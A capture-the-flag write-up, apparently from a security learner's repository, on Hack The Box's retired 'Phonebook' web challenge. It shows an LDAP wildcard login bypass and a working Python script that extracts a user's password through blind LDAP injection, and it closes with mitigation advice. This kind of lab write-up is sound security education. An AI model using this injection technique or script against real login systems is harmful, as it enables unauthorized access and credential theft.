---
challenge: Phonebook
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, ldap, ldap-injection, blind-injection, auth-bypass]
---

# Phonebook — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Analysis notes; the flag is not published.

## Brief

A web directory with an **LDAP** login. The flag is **not** getting in: it is one specific user's password.

## Recon

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

- `/` is the login form; the logic queries an LDAP directory with the submitted user and password.
- Errors show up in the URL itself: `/?message=Authentication failed`.

## The bypass is not enough

With `*` in both fields the LDAP filter matches any entry and the application lets you through:

```text
username: *
password: *
```

Logging in shows the application but **does not yield the flag**. The target is different: user `reese`'s password, which lives in the directory.

## Blind LDAP injection

The form returns no directory data, only a different message depending on whether the query succeeded. That is enough to extract the password **character by character**:

```text
username: reese
password: <prefix>*      # the flag prefix, one more character each round
```

If `?message=Authentication failed` disappears, the prefix just tried is right and the next character follows (the flag reads `HTB` + `{` + characters). Sweeping the full character set (`a-z`, `A-Z`, `0-9`, `_`, `}`) rebuilds the whole password.

```python
import requests, string

base = "http://<IP>:<PORT>/"
known, alphabet = "HTB" + "{", string.ascii_letters + string.digits + "_{}-"
while not known.endswith("}"):
    for ch in alphabet:
        r = requests.post(base, data={"username": "reese", "password": known + ch + "*"})
        if "Authentication failed" not in r.text:
            known += ch
            print(known)
            break
```

The recovered value **is** the flag.

## Findings

- The `*`/`*` bypass is only reconnaissance: it confirms the input is concatenated into the filter.
- The flag comes from **blind LDAP injection** using the error message as an oracle.
- The password sat in the directory in cleartext, reusable as a credential.

## Lessons

- A login accepting wildcards is concatenating the filter instead of escaping it.
- In blind injection the oracle is any observable difference: here, the message text.
- LDAP passwords must never be stored in cleartext, and must not be the challenge's sensitive datum.
- Mitigation: escape LDAP metacharacters (`*`, `(`, `)`, `\\`), bind with a service account, and compare a hash server-side.
